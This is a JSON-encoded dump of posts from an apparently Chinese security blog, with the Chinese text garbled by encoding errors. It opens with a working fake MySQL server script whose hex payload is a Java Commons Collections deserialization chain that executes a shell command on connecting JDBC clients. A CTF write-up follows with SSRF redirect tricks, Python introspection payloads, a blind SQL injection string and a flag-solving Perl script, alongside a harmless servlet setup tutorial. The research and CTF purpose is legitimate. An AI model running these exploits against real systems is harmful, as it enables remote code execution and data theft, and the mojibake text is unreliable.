\u0026#39;01000001031b00000203646566000000054c6576656c000c210015000000fd01001f00001a0000030364656600000004436f6465000c3f000400000003a1000000001d00000403646566000000074d657373616765000c210000060000fd01001f000059000005075761726e696e6704313238374b27404071756572795f63616368655f73697a6527206973206465707265636174656420616e642077696c6c2062652072656d6f76656420696e2061206675747572652072656c656173652e59000006075761726e696e6704313238374b27404071756572795f63616368655f7479706527206973206465707265636174656420616e642077696c6c2062652072656d6f76656420696e2061206675747572652072656c656173652e07000007fe000002000000\u0026#39; send_data(conn, _payload) data = receive_data(conn) if \u0026#34;set names\u0026#34; in data: send_data(conn, response_ok_data) data = receive_data(conn) if \u0026#34;set character_set_results\u0026#34; in data: send_data(conn, response_ok_data) data = receive_data(conn) if \u0026#34;show session status\u0026#34; in data: mydata = \u0026#39;01000001013800000203646566087365637572697479096576696c7461626c65096576696c7461626c65046576696c046576696c0c3f00ffff0000fc900000000003050003fc0005aced0005737200136a6176612e7574696c2e486173687461626c6513bb0f25214ae4b803000246000a6c6f6164466163746f724900097468726573686f6c6478703f4000000000000877080000000b000000027372002a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6d61702e4c617a794d61706ee594829e7910940300014c0007666163746f727974002c4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436861696e65645472616e73666f726d657230c797ec287a97040200015b000d695472616e73666f726d65727374002d5b4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707572002d5b4c6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e5472616e73666f726d65723bbd562af1d83418990200007870000000057372003b6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436f6e7374616e745472616e73666f726d6572587690114102b1940200014c000969436f6e7374616e747400124c6a6176612f6c616e672f4f626a6563743b7870767200116a6176612e6c616e672e52756e74696d65000000000000000000000078707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e496e766f6b65725472616e73666f726d657287e8ff6b7b7cce380200035b000569417267737400135b4c6a6176612f6c616e672f4f626a6563743b4c000b694d6574686f644e616d657400124c6a6176612f6c616e672f537472696e673b5b000b69506172616d54797065737400125b4c6a6176612f6c616e672f436c6173733b7870757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000274000a67657452756e74696d65757200125b4c6a6176612e6c616e672e436c6173733bab16d7aecbcd5a990200007870000000007400096765744d6574686f647571007e001700000002767200106a6176612e6c616e672e537472696e67a0f0a4387a3bb34202000078707671007e00177371007e000f7571007e001400000002707571007e001400000000740006696e766f6b657571007e001700000002767200106a6176612e6c616e672e4f626a656374000000000000000000000078707671007e00147371007e000f757200135b4c6a6176612e6c616e672e537472696e673badd256e7e91d7b4702000078700000000174000e746f756368202f746d702f636337740004657865637571007e00170000000171007e001c7371007e000a737200116a6176612e6c616e672e496e746567657212e2a0a4f781873802000149000576616c7565787200106a6176612e6c616e672e4e756d62657286ac951d0b94e08b020000787000000001737200116a6176612e7574696c2e486173684d61700507dac1c31660d103000246000a6c6f6164466163746f724900097468726573686f6c6478703f4000000000000c77080000001000000001740002797971007e002f787871007e002f7371007e000271007e00077371007e00303f4000000000000c770800000010000000017400027a5a71007e002f78787371007e002d000000027807000004fe000022000000\u0026#39; send_data(conn, mydata) data = receive_data(conn) if \u0026#34;show warnings\u0026#34; in data: payload = \u0026#39;01000001031b00000203646566000000054c6576656c000c210015000000fd01001f00001a0000030364656600000004436f6465000c3f000400000003a1000000001d00000403646566000000074d657373616765000c210000060000fd01001f00006d000005044e6f74650431313035625175657279202753484f572053455353494f4e20535441545553272072657772697474656e20746f202773656c6563742069642c6f626a2066726f6d2063657368692e6f626a73272062792061207175657279207265777269746520706c7567696e07000006fe000002000000\u0026#39; send_data(conn, payload) break if __name__ == \u0026#39;__main__\u0026#39;: HOST =\u0026#39;0.0.0.0\u0026#39; PORT = 3309 sk = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #å½“socketå…³é—­åï¼Œæœ¬åœ°ç«¯ç”¨äºè¯¥socketçš„ç«¯å£å·ç«‹åˆ»å°±å¯ä»¥è¢«é‡ç”¨.ä¸ºäº†å®éªŒçš„æ—¶å€™ä¸ç”¨ç­‰å¾…å¾ˆé•¿æ—¶é—´ sk.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) sk.bind((HOST, PORT)) sk.listen(1) print(\u0026#34;start fake mysql server listening on {}:{}\u0026#34;.format(HOST,PORT)) run() è¯šç„¶ï¼Œè¿™ç§æ–¹æ³•æ˜¯æ²¡æœ‰ä¸Šä¸€ä¸ªè„šæœ¬æ¥å¾—è‡ªåŠ¨åŒ–çš„ï¼Œä½†æ˜¯æ¯”è¾ƒæ–¹ä¾¿å¤ç°ã€‚\n","permalink":"https://dragonbox.top/posts/sec-jdbc-unserialize/","summary":"\u003cblockquote\u003e\n\u003cp\u003eæˆ‘ç»ˆäºæ›´æ–°åšå®¢äº†â€¦â€¦\u003c/p\u003e\n\u003c/blockquote\u003e","title":"mysql jdbcååºåˆ—åŒ–çš„ä¸æ·±å…¥ç ”ç©¶"},{"content":"é‡‡ç”¨çš„æ˜¯ç‰ˆæœ¬è¾ƒæ–°çš„idea2020.2, ä½¿ç”¨çš„æ“ä½œç³»ç»Ÿä¸ºMANJARO LINUX, å…¶ä¸­çš„è¿‡ç¨‹æŒºè¿·è¿·ç³Šç³Šçš„å°±æ°´ä¸€ç¯‡æ¥è®°å½•ä¸€ä¸‹.\nFile --\u0026gt; New --\u0026gt; Project --\u0026gt; Java --\u0026gt; Nextnext æ–°å»ºä¸€ä¸ªé¡¹ç›® å³é”®Project --\u0026gt; open module setting --\u0026gt; ç‚¹å‡»+å· --\u0026gt; å¯¼å…¥tomcat8çš„Servlet-api.jar å³é”®é¡¹ç›® --\u0026gt; Add Frameworks Support --\u0026gt; é€‰ä¸­web application é€‰ä¸­åä¼šå¤šå‡ºæ¥å‡ ä¸ªä¸œè¥¿, å¦‚ä¸‹å›¾, å¤šäº†WEB-INFç›®å½•å’Œindex.jsp\nWeb-INFé‡Œé¢æœ‰åªæœ‰ä¸€ä¸ªweb.xml, ä»€ä¹ˆæ˜¯WEB-INF? æ ¹æ®ç™¾åº¦ç™¾ç§‘çš„ä»‹ç»\nWEB-INFæ˜¯Javaçš„WEBåº”ç”¨çš„å®‰å…¨ç›®å½•ã€‚æ‰€è°“å®‰å…¨å°±æ˜¯å®¢æˆ·ç«¯æ— æ³•è®¿é—®ï¼Œåªæœ‰æœåŠ¡ç«¯å¯ä»¥è®¿é—®çš„ç›®å½•ã€‚å¦‚æœæƒ³åœ¨é¡µé¢ä¸­ç›´æ¥è®¿é—®å…¶ä¸­çš„æ–‡ä»¶ï¼Œå¿…é¡»é€šè¿‡web.xmlæ–‡ä»¶å¯¹è¦è®¿é—®çš„æ–‡ä»¶è¿›è¡Œç›¸åº”æ˜ å°„æ‰èƒ½è®¿é—®ã€‚\nWEB-INFæ–‡ä»¶å¤¹ä¸‹é™¤äº†web.xmlå¤–ï¼Œè¿˜å­˜ä¸€ä¸ªclassesæ–‡ä»¶å¤¹ï¼Œç”¨ä»¥æ”¾ç½® *.classæ–‡ä»¶ï¼Œè¿™äº› *.classæ–‡ä»¶æ˜¯ç½‘ç«™è®¾è®¡äººå‘˜ç¼–å†™çš„ç±»åº“ï¼Œå®ç°äº†jspé¡µé¢å‰å°ç¾å·¥ä¸åå°æœåŠ¡çš„åˆ†ç¦»ï¼Œä½¿å¾—ç½‘ç«™çš„ç»´æŠ¤éå¸¸æ–¹ä¾¿ã€‚web.xmlæ–‡ä»¶ä¸ºç½‘ç«™éƒ¨ç½²æè¿°XMLæ–‡ä»¶ï¼Œå¯¹ç½‘ç«™çš„éƒ¨ç½²éå¸¸é‡è¦ã€‚\nWeb-Infæ–‡ä»¶å¤¹ä¸­é™¤äº†æœ‰classesæ–‡ä»¶å¤¹å’Œä¸€ä¸ªweb.xmlæ–‡ä»¶å¤–ã€è¿˜æœ‰libæ–‡ä»¶å¤¹ï¼ˆç”¨äºå­˜æ”¾éœ€è¦çš„jaråŒ…ï¼‰ï¼ˆç”¨äºé…ç½®ï¼Œæ¯”å¦‚è¯´ç”¨æ¥é…ç½®è¿‡æ»¤å™¨ç­‰ã€‚ï¼‰\n/WEB-INF/src/ æºç ç›®å½•ï¼ŒæŒ‰ç…§åŒ…åç»“æ„æ”¾ç½®å„ä¸ªjavaæ–‡ä»¶ã€‚\n/WEB-INF/database.properties æ•°æ®åº“é…ç½®æ–‡ä»¶\n/WEB-INF/tags/\nå­˜æ”¾äº†è‡ªå®šä¹‰æ ‡ç­¾æ–‡ä»¶ï¼Œè¯¥ç›®å½•å¹¶ä¸ä¸€å®šä¸º tagsï¼Œå¯ä»¥æ ¹æ®è‡ªå·±çš„å–œå¥½å’Œä¹ æƒ¯ä¸ºè‡ªå·±çš„æ ‡ç­¾æ–‡ä»¶åº“å‘½åï¼Œå½“ä½¿ç”¨è‡ªå®šä¹‰çš„æ ‡ç­¾æ–‡ä»¶åº“åç§°æ—¶ï¼Œåœ¨ä½¿ç”¨æ ‡ç­¾æ–‡ä»¶æ—¶å°±å¿…é¡»å£°æ˜æ­£ç¡®çš„æ ‡ç­¾æ–‡ä»¶åº“è·¯å¾„ã€‚ä¾‹å¦‚ï¼šå½“è‡ªå®šä¹‰æ ‡ç­¾æ–‡ä»¶åº“åç§°ä¸º simpleTags æ—¶ï¼Œåœ¨ä½¿ç”¨ simpleTags ç›®å½•ä¸‹çš„æ ‡ç­¾æ–‡ä»¶æ—¶ï¼Œå°±å¿…é¡»åœ¨ jsp æ–‡ä»¶å¤´å£°æ˜ä¸ºï¼š\u0026lt;%@ taglibprefix=\u0026ldquo;tags\u0026rdquo; tagdir=\u0026quot;/WEB-INF /simpleTags\u0026quot; % \u0026gt;ã€‚\n/WEB-INF/jsp/\njsp 1.2 ä»¥ä¸‹ç‰ˆæœ¬çš„æ–‡ä»¶å­˜æ”¾ä½ç½®ã€‚æ”¹ç›®å½•æ²¡æœ‰ç‰¹å®šçš„å£°æ˜ï¼ŒåŒæ ·ï¼Œå¯ä»¥æ ¹æ®è‡ªå·±çš„å–œå¥½ä¸ä¹ æƒ¯æ¥å‘½åã€‚æ­¤ç›®å½•ä¸»è¦å­˜æ”¾çš„æ˜¯ jsp 1.2 ä»¥ä¸‹ç‰ˆæœ¬çš„æ–‡ä»¶ï¼Œä¸ºåŒºåˆ† jsp 2.0 æ–‡ä»¶ï¼Œé€šå¸¸ä½¿ç”¨ jsp å‘½åï¼Œå½“ç„¶ä½ ä¹Ÿå¯ä»¥å‘½åä¸º jspOldEdition ã€‚\n/WEB-INF/jsp2/\nä¸ jsp æ–‡ä»¶ç›®å½•ç›¸æ¯”ï¼Œè¯¥ç›®å½•ä¸‹ä¸»è¦å­˜æ”¾ Jsp 2.0 ä»¥ä¸‹ç‰ˆæœ¬çš„æ–‡ä»¶ï¼Œå½“ç„¶ï¼Œå®ƒä¹Ÿæ˜¯å¯ä»¥ä»»æ„å‘½åçš„ï¼ŒåŒæ ·ä¸ºåŒºåˆ« Jsp 1.2ä»¥ä¸‹ç‰ˆæœ¬çš„æ–‡ä»¶ç›®å½•ï¼Œé€šå¸¸æ‰å‘½åä¸º jsp2ã€‚\nMETA-INF\nç›¸å½“äºä¸€ä¸ªä¿¡æ¯åŒ…ï¼Œç›®å½•ä¸­çš„æ–‡ä»¶å’Œç›®å½•è·å¾—Java 2å¹³å°çš„è®¤å¯ä¸è§£é‡Šï¼Œç”¨æ¥é…ç½®åº”ç”¨ç¨‹åºã€æ‰©å±•ç¨‹åºã€ç±»åŠ è½½å™¨å’ŒæœåŠ¡ manifest.mfæ–‡ä»¶ï¼Œåœ¨ç”¨jaræ‰“åŒ…æ—¶è‡ªåŠ¨ç”Ÿæˆã€‚\næœ€é‡è¦çš„æ˜¯classesæ–‡ä»¶å¤¹å’Œlibæ–‡ä»¶å¤¹, æ‰€ä»¥æ–°å»ºä¸¤ä¸ªæ–‡ä»¶å¤¹, ä¸€ä¸ªæ˜¯classes, å¦ä¸€ä¸ªæ˜¯lib, é…ç½®é¡¹ç›®ç»“æ„è®©ç¼–è¯‘å‡ºæ¥çš„classæ–‡ä»¶è¾“å‡ºåˆ°classesä¸­å»\nç„¶ååœ¨srcç›®å½•ä¸‹é¢ç¼–å†™TestServlet.javaæ–‡ä»¶\nimport javax.servlet.ServletException; import javax.servlet.annotation.WebServlet; import javax.servlet.http.HttpServlet; import javax.servlet.http.HttpServletRequest; import javax.servlet.http.HttpServletResponse; import java.io.IOException; @WebServlet(\u0026#34;/TestServlet\u0026#34;) public class TestServelet extends HttpServlet { @Override protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws IOException, ServletException { resp.getWriter().write(\u0026#34;my first servlet\u0026#34;); } } ç„¶åæ·»åŠ è¿è¡Œé…ç½®, åœ¨Manjaro linuxé‡Œé¢tomcatçš„ç›®å½•æ˜¯/usr/share/tomcat8/, ps: ä¸ºäº†ä¸å’Œburpsuiteçš„é»˜è®¤ç«¯å£å†²çª, æˆ‘å°†tomcatæœåŠ¡çš„é»˜è®¤ç«¯å£è®¾ç½®åœ¨äº†8081.\nå¦‚æœæœ‰æç¤ºé”™è¯¯çš„åŒ–å°±ç‚¹å‡»fixå»ä¿®å¤, ç„¶ååœ¨Developmentä¸‹é¢ä¿®æ”¹context, è¿™æ ·å°±å¯ä»¥é€šè¿‡http://localhost:8081/MyServletè®¿é—®åˆ°æœåŠ¡äº†.\nç‚¹å‡»è¿è¡Œå°±å¯ä»¥å¯åŠ¨TomcatæœåŠ¡å™¨äº†.\n","permalink":"https://dragonbox.top/posts/tech-idea-start-servlet/","summary":"\u003cp\u003eé‡‡ç”¨çš„æ˜¯ç‰ˆæœ¬è¾ƒæ–°çš„idea2020.2, ä½¿ç”¨çš„æ“ä½œç³»ç»Ÿä¸º\u003ccode\u003eMANJARO LINUX\u003c/code\u003e, å…¶ä¸­çš„è¿‡ç¨‹æŒºè¿·è¿·ç³Šç³Šçš„å°±æ°´ä¸€ç¯‡æ¥è®°å½•ä¸€ä¸‹.\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003eFile --\u0026gt; New --\u0026gt; Project --\u0026gt; Java --\u0026gt; Nextnext æ–°å»ºä¸€ä¸ªé¡¹ç›®\n\u003c/code\u003e\u003c/pre\u003e\u003cpre tabindex=\"0\"\u003e\u003ccode\u003eå³é”®Project --\u0026gt; open module setting --\u0026gt; ç‚¹å‡»+å· --\u0026gt; å¯¼å…¥tomcat8çš„Servlet-api.jar \n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u003cimg loading=\"lazy\" src=\"image-20211114141517710.png\" alt=\"image-20211114141517710\"  /\u003e\n\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003eå³é”®é¡¹ç›® --\u0026gt; Add Frameworks Support --\u0026gt; é€‰ä¸­web application\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u003cimg loading=\"lazy\" src=\"image-20211114141525898.png\" alt=\"image-20211114141525898\"  /\u003e\n\u003c/p\u003e\n\u003cp\u003eé€‰ä¸­åä¼šå¤šå‡ºæ¥å‡ ä¸ªä¸œè¥¿, å¦‚ä¸‹å›¾, å¤šäº†\u003ccode\u003eWEB-INF\u003c/code\u003eç›®å½•å’Œ\u003ccode\u003eindex.jsp\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"image-20211114141531496.png\" alt=\"image-20211114141531496\"  /\u003e\n\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003eWeb-INF\u003c/code\u003eé‡Œé¢æœ‰åªæœ‰ä¸€ä¸ª\u003ccode\u003eweb.xml\u003c/code\u003e, ä»€ä¹ˆæ˜¯\u003ccode\u003eWEB-INF\u003c/code\u003e? æ ¹æ®ç™¾åº¦ç™¾ç§‘çš„ä»‹ç»\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003eWEB-INFæ˜¯Javaçš„WEBåº”ç”¨çš„å®‰å…¨ç›®å½•ã€‚æ‰€è°“å®‰å…¨å°±æ˜¯å®¢æˆ·ç«¯æ— æ³•è®¿é—®ï¼Œåªæœ‰æœåŠ¡ç«¯å¯ä»¥è®¿é—®çš„ç›®å½•ã€‚å¦‚æœæƒ³åœ¨é¡µé¢ä¸­ç›´æ¥è®¿é—®å…¶ä¸­çš„æ–‡ä»¶ï¼Œå¿…é¡»é€šè¿‡web.xmlæ–‡ä»¶å¯¹è¦è®¿é—®çš„æ–‡ä»¶è¿›è¡Œç›¸åº”æ˜ å°„æ‰èƒ½è®¿é—®ã€‚\u003c/p\u003e\n\u003cp\u003eWEB-INFæ–‡ä»¶å¤¹ä¸‹é™¤äº†web.xmlå¤–ï¼Œè¿˜å­˜ä¸€ä¸ªclassesæ–‡ä»¶å¤¹ï¼Œç”¨ä»¥æ”¾ç½® *.classæ–‡ä»¶ï¼Œè¿™äº› *.classæ–‡ä»¶æ˜¯ç½‘ç«™è®¾è®¡äººå‘˜ç¼–å†™çš„ç±»åº“ï¼Œå®ç°äº†jspé¡µé¢å‰å°ç¾å·¥ä¸åå°æœåŠ¡çš„åˆ†ç¦»ï¼Œä½¿å¾—ç½‘ç«™çš„ç»´æŠ¤éå¸¸æ–¹ä¾¿ã€‚web.xmlæ–‡ä»¶ä¸ºç½‘ç«™éƒ¨ç½²æè¿°XMLæ–‡ä»¶ï¼Œå¯¹ç½‘ç«™çš„éƒ¨ç½²éå¸¸é‡è¦ã€‚\u003c/p\u003e\n\u003cp\u003eWeb-Infæ–‡ä»¶å¤¹ä¸­é™¤äº†æœ‰classesæ–‡ä»¶å¤¹å’Œä¸€ä¸ªweb.xmlæ–‡ä»¶å¤–ã€è¿˜æœ‰libæ–‡ä»¶å¤¹ï¼ˆç”¨äºå­˜æ”¾éœ€è¦çš„jaråŒ…ï¼‰ï¼ˆç”¨äºé…ç½®ï¼Œæ¯”å¦‚è¯´ç”¨æ¥é…ç½®è¿‡æ»¤å™¨ç­‰ã€‚ï¼‰\u003c/p\u003e\n\u003cp\u003e/WEB-INF/src/\nã€€ã€€æºç ç›®å½•ï¼ŒæŒ‰ç…§åŒ…åç»“æ„æ”¾ç½®å„ä¸ªjavaæ–‡ä»¶ã€‚\u003c/p\u003e\n\u003cp\u003e/WEB-INF/database.properties\nã€€ã€€æ•°æ®åº“é…ç½®æ–‡ä»¶\u003c/p\u003e\n\u003cp\u003e/WEB-INF/tags/\u003c/p\u003e\n\u003cp\u003eå­˜æ”¾äº†è‡ªå®šä¹‰æ ‡ç­¾æ–‡ä»¶ï¼Œè¯¥ç›®å½•å¹¶ä¸ä¸€å®šä¸º tagsï¼Œå¯ä»¥æ ¹æ®è‡ªå·±çš„å–œå¥½å’Œä¹ æƒ¯ä¸ºè‡ªå·±çš„æ ‡ç­¾æ–‡ä»¶åº“å‘½åï¼Œå½“ä½¿ç”¨è‡ªå®šä¹‰çš„æ ‡ç­¾æ–‡ä»¶åº“åç§°æ—¶ï¼Œåœ¨ä½¿ç”¨æ ‡ç­¾æ–‡ä»¶æ—¶å°±å¿…é¡»å£°æ˜æ­£ç¡®çš„æ ‡ç­¾æ–‡ä»¶åº“è·¯å¾„ã€‚ä¾‹å¦‚ï¼šå½“è‡ªå®šä¹‰æ ‡ç­¾æ–‡ä»¶åº“åç§°ä¸º simpleTags æ—¶ï¼Œåœ¨ä½¿ç”¨ simpleTags ç›®å½•ä¸‹çš„æ ‡ç­¾æ–‡ä»¶æ—¶ï¼Œå°±å¿…é¡»åœ¨ jsp æ–‡ä»¶å¤´å£°æ˜ä¸ºï¼š\u0026lt;%@ taglibprefix=\u0026ldquo;tags\u0026rdquo; tagdir=\u0026quot;/WEB-INF /simpleTags\u0026quot; % \u0026gt;ã€‚\u003c/p\u003e\n\u003cp\u003e/WEB-INF/jsp/\u003c/p\u003e\n\u003cp\u003ejsp 1.2 ä»¥ä¸‹ç‰ˆæœ¬çš„æ–‡ä»¶å­˜æ”¾ä½ç½®ã€‚æ”¹ç›®å½•æ²¡æœ‰ç‰¹å®šçš„å£°æ˜ï¼ŒåŒæ ·ï¼Œå¯ä»¥æ ¹æ®è‡ªå·±çš„å–œå¥½ä¸ä¹ æƒ¯æ¥å‘½åã€‚æ­¤ç›®å½•ä¸»è¦å­˜æ”¾çš„æ˜¯ jsp 1.2 ä»¥ä¸‹ç‰ˆæœ¬çš„æ–‡ä»¶ï¼Œä¸ºåŒºåˆ† jsp 2.0 æ–‡ä»¶ï¼Œé€šå¸¸ä½¿ç”¨ jsp å‘½åï¼Œå½“ç„¶ä½ ä¹Ÿå¯ä»¥å‘½åä¸º jspOldEdition ã€‚\u003c/p\u003e","title":"ä½¿ç”¨ideaå¼€å¯Servlet"},{"content":"simpleflask å’Œä»¥å¾€çš„flaskä¸ä¸€æ ·çš„åœ°æ–¹åœ¨äº, è¿™é‡Œæ˜¯ç»è¿‡æ›´æ–°åçš„flask, è®¡ç®—pinç çš„æ–¹å¼å·²ç»å’Œä»¥å‰ä¸ä¸€æ ·äº†, å‚è€ƒ https://www.chainnews.com/articles/898433701852.htm, ä¸è¿‡é—®é¢˜ä¸å¤§,å°±æŠŠmachine-idæ‹¼æ¥åœ¨dockeré‚£ä¸€ä¸²ä¸œè¥¿çš„å‰é¢å°±å¯ä»¥äº†, éœ€è¦æ³¨æ„çš„æ˜¯æ¯ååˆ†é’Ÿé‡å¯æ—¶å€™çš„æœºå™¨macåœ°å€æ˜¯ä¼šå˜åŒ–çš„.\nezflask ç‚¹å‡»çœ‹åˆ°ä»£ç \n# -*- coding: utf-8 -*- from flask import Flask, request import requests from waf import * import time app = Flask(__name__) @app.route(\u0026#39;/ctfhint\u0026#39;) def ctf(): hint =xxxx # hints trick = xxxx # trick return trick @app.route(\u0026#39;/\u0026#39;) def index(): # app.txt @app.route(\u0026#39;/eval\u0026#39;, methods=[\u0026#34;POST\u0026#34;]) def my_eval(): # post eval @app.route(xxxxxx, methods=[\u0026#34;POST\u0026#34;]) # Secret def admin(): # admin requests # if __name__ == \u0026#39;__main__\u0026#39;: app.run(host=\u0026#39;0.0.0.0\u0026#39;,port=8080) å‘ç°\u0026quot; ' [ ( éƒ½è¢«è¿‡æ»¤äº†, ç®€ç›´ç¦»è°±\neval=ctf.__globals__ æ¥æŸ¥çœ‹ctfå‡½æ•°æ‰€å¤„åœ¨çš„å‘½åç©ºé—´ä¸‹æ‰€èƒ½æ¥è§¦åˆ°çš„å˜é‡å’Œå‡½æ•°\n{\u0026#39;my_eval\u0026#39;: \u0026lt;function my_eval at 0x7fb525c35dd0\u0026gt;, \u0026#39;app\u0026#39;: \u0026lt;Flask \u0026#39;app_1\u0026#39;\u0026gt;, \u0026#39;waf_eval\u0026#39;: \u0026lt;function waf_eval at 0x7fb525c35c50\u0026gt;, \u0026#39;admin\u0026#39;: \u0026lt;function admin at 0x7fb525b7f650\u0026gt;, \u0026#39;index\u0026#39;: \u0026lt;function index at 0x7fb525c35d50\u0026gt;, \u0026#39;waf_ip\u0026#39;: \u0026lt;function waf_ip at 0x7fb525c35b50\u0026gt;, \u0026#39;__builtins__\u0026#39;: \u0026lt;module \u0026#39;__builtin__\u0026#39; (built-in)\u0026gt;, \u0026#39;admin_route\u0026#39;: \u0026#39;/h4rdt0f1nd_9792uagcaca00qjaf\u0026#39;, \u0026#39;__file__\u0026#39;: \u0026#39;app_1.py\u0026#39;, \u0026#39;request\u0026#39;: \u0026lt;Request \u0026#39;http://124.70.206.91:10003/eval\u0026#39; [POST]\u0026gt;, \u0026#39;__package__\u0026#39;: None, \u0026#39;Flask\u0026#39;: \u0026lt;class \u0026#39;flask.app.Flask\u0026#39;\u0026gt;, \u0026#39;ctf\u0026#39;: \u0026lt;function ctf at 0x7fb525c35cd0\u0026gt;, \u0026#39;waf_path\u0026#39;: \u0026lt;function waf_path at 0x7fb525c35bd0\u0026gt;, \u0026#39;time\u0026#39;: \u0026lt;module \u0026#39;time\u0026#39; from \u0026#39;/usr/local/lib/python2.7/lib-dynload/time.so\u0026#39;\u0026gt;, \u0026#39;__name__\u0026#39;: \u0026#39;__main__\u0026#39;, \u0026#39;requests\u0026#39;: \u0026lt;module \u0026#39;requests\u0026#39; from \u0026#39;/usr/local/lib/python2.7/site-packages/requests/__init__.pyc\u0026#39;\u0026gt;, \u0026#39;__doc__\u0026#39;: None} å‘ç°äº†admin_route, ç„¶åé‚£é‡Œæ˜¯å¯ä»¥å‘èµ·ä¸€ä¸ªå¯¹å¤–è¯·æ±‚çš„, ç»è¿‡æµ‹è¯•å‘ç°127.0.0.1å’Œ0.0.0.0åŠå…¶å˜å½¢éƒ½ä¼šè§¦å‘è­¦å‘Šå¹¶é€€å‡º, ç›²çŒœè¿™é‡Œè€ƒå¯Ÿçš„æ˜¯302é‡å®šå‘, åœ¨æœåŠ¡ç«¯é‚£é‡Œå†™ä¸‹\n\u0026lt;?php header(\u0026#34;Location: http://127.0.0.1:8080/\u0026#34;); ?\u0026gt; ssrfæˆåŠŸ, ä½†æ˜¯ä¸‹ä¸€æ­¥å¹²å˜›å‘¢?\n__code__, å‡½æ•°çš„ä»£ç å—\n__code__.co_consts ä»£ç å—ä¸­çš„æ‰€æœ‰å¸¸é‡çš„å…ƒç»„, å‚è€ƒhttps://docs.python.org/3/library/inspect.html\neval=ctf.__code__.co_consts (None, \u0026#39;the admin route :h4rdt0f1nd_9792uagcaca00qjaf\u0026lt;!-- port : 5000 --\u0026gt;\u0026#39;, \u0026#39;too young too simple\u0026#39;) ç„¶åé€šè¿‡302é‡å®šå‘è®¿é—®127.0.0.1:5000, æ˜¯ä¸€ä¸ªå¸¸è§„çš„ssti,å†æ¬¡é‡å®šå‘\nXWIKI æ‰¾åˆ°äº†CVE, ç„¶åæ ¹æ®ä¾‹å­åå¼¹shellåå‘ç°æœ‰ä¸€ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶, ä¼šç»™ä½ å¾ˆå¤šé€‰æ‹©é¢˜æ¯”è¾ƒå¤§å°çš„, åˆ°è¿™é‡Œå°±åšä¸å‡ºæ¥äº†, ä¸è¿‡çœ‹åˆ°å…¶ä»–é€‰æ‰‹çš„è„šæœ¬, è¿™é‡Œè®°å½•ä¸€ä¸‹.\nuse strict; use IPC::Open3; my $pid = open3( \\*CHLD_IN, \\*CHLD_OUT, \\*CHLD_ERR, \u0026#39;/readflag\u0026#39; ) or die \u0026#34;open3() failed $!\u0026#34;; my $r; $r = \u0026lt;CHLD_OUT\u0026gt;; print \u0026#34;$r\u0026#34;; $r = \u0026lt;CHLD_OUT\u0026gt;; print \u0026#34;$r\u0026#34;; $r = eval \u0026#34;$r\u0026#34;; print \u0026#34;$r\\n\u0026#34;; print CHLD_IN \u0026#34;$r\\n\u0026#34;; $r = \u0026lt;CHLD_OUT\u0026gt;; print \u0026#34;$r\u0026#34;; $r = \u0026lt;CHLD_OUT\u0026gt;; print \u0026#34;$r\u0026#34;; carefuleyes åœ¨æ”¹åçš„åœ°æ–¹è¿›è¡ŒäºŒæ¬¡æ³¨å…¥\nsd\u0026#39; or if(substr((select group_concat(username) from user where privilege=\u0026#39;admin\u0026#39;),1,1)=\u0026#39;X\u0026#39;,exp(5000),1)# å¾—åˆ°ç”¨æˆ·åå’Œå¯†ç ä¹‹åè¿›è¡Œåºåˆ—åŒ–ç™»é™†å°±å¯ä»¥äº†\n","permalink":"https://dragonbox.top/posts/ctf-gactf2020/","summary":"\u003ch2 id=\"simpleflask\"\u003esimpleflask\u003c/h2\u003e\n\u003cp\u003eå’Œä»¥å¾€çš„flaskä¸ä¸€æ ·çš„åœ°æ–¹åœ¨äº, è¿™é‡Œæ˜¯ç»è¿‡æ›´æ–°åçš„flask, è®¡ç®—pinç çš„æ–¹å¼å·²ç»å’Œä»¥å‰ä¸ä¸€æ ·äº†, å‚è€ƒ \u003ca href=\"https://www.chainnews.com/articles/898433701852.htm\"\u003ehttps://www.chainnews.com/articles/898433701852.htm\u003c/a\u003e, ä¸è¿‡é—®é¢˜ä¸å¤§,å°±æŠŠmachine-idæ‹¼æ¥åœ¨dockeré‚£ä¸€ä¸²ä¸œè¥¿çš„å‰é¢å°±å¯ä»¥äº†, éœ€è¦æ³¨æ„çš„æ˜¯æ¯ååˆ†é’Ÿé‡å¯æ—¶å€™çš„æœºå™¨macåœ°å€æ˜¯ä¼šå˜åŒ–çš„.\u003c/p\u003e","title":"GACTF2020"},{"content":"half_infiltration å¼€å±€çš„é¡µé¢å¦‚ä¸‹\n\u0026lt;?php highlight_file(__FILE__); $flag=file_get_contents(\u0026#39;ssrf.php\u0026#39;); class Pass { function read() { ob_start(); global $result; print $result; } } class User { public $age,$sex,$num; function __destruct() { $student = $this-\u0026gt;age; $boy = $this-\u0026gt;sex; $a = $this-\u0026gt;num; $student-\u0026gt;$boy(); if(!(is_string($a)) ||!(is_string($boy)) || !(is_object($student))) { ob_end_clean(); exit(); } global $$a; $result=$GLOBALS[\u0026#39;flag\u0026#39;]; ob_end_clean(); } } if (isset($_GET[\u0026#39;x\u0026#39;])) { unserialize($_GET[\u0026#39;x\u0026#39;])-\u0026gt;get_it(); } æ€è·¯æ˜¯è¿›è¡Œä¸¤æ¬¡ååºåˆ—åŒ–, ç¬¬ä¸€æ¬¡å°†$_GLOBALS[\u0026lsquo;flag\u0026rsquo;]èµ‹å€¼ç»™å…¨å±€å˜é‡$result, 